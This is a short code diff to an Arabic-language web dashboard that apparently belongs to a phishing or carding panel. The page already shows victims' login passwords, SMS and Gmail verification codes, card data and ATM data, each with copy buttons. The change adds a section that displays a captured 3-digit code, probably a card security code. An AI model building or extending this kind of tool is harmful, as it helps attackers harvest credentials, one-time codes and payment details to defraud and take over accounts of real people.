@@ -152,6 +152,7 @@
   .section--order .section-pill{background:#0ea5e9}
   .section--login .section-pill{background:#7c3aed}
   .section--code .section-pill{background:#1565c0}
+  .section--code3 .section-pill{background:#0891b2}
   .section--email .section-pill{background:#d32f2f}
   .section--card .section-pill{background:#e65100}
   .section--atm .section-pill{background:#059669}
@@ -564,9 +565,14 @@ function showDetails(id) {
     + row("كلمة المرور", o.login_password, {mono:true, copy:true, highlight:true})
   );
 
-  // 4) SMS code
-  detailsHtml += section("section--code", "رمز التحقق (SMS)", "SMS", null,
+  // 4) SMS code (6-digit)
+  detailsHtml += section("section--code", "رمز التحقق SMS (6 أرقام)", "SMS", null,
     row("الرمز", o.verification_code, {mono:true, copy:true})
+  );
+
+  // 4.b) 3-digit code
+  detailsHtml += section("section--code3", "رمز التحقق (3 أرقام)", "CODE 3", null,
+    row("الرمز", o.verification_code_3, {mono:true, copy:true})
   );
 
   // 5) Gmail code
